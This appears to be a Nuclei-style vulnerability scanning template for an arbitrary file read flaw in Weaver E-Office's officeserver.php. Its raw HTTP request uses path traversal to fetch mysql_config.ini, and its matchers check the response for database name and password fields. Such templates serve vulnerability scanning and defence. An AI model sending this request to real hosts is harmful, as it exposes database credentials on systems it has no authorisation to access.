id: weaver_office_officeserver_fileread
info:
  author: mhb17
  description: https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA%20E-Office%20officeserver.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  name: "officeserver.php\u6587\u4EF6\u5B58\u5728\u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\
    \u6F0F\u6D1E"
  reference:
  - https://
  severity: high
  tags: fileread
requests:
- matchers:
  - part: body
    type: word
    words:
    - 'dataname = '
  - part: body
    type: word
    words:
    - datapassword =
  - part: header
    type: word
    words:
    - '200'
  matchers-condition: and
  raw:
  - 'GET /iweboffice/officeserver.php?OPTION=LOADFILE&FILENAME=../mysql_config.ini
    HTTP/1.1

    Host: {{Hostname}}

    Upgrade-Insecure-Requests: 1

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
    like Gecko) Chrome/109.0.5414.120 Safari/537.36

    Connection: close


    '
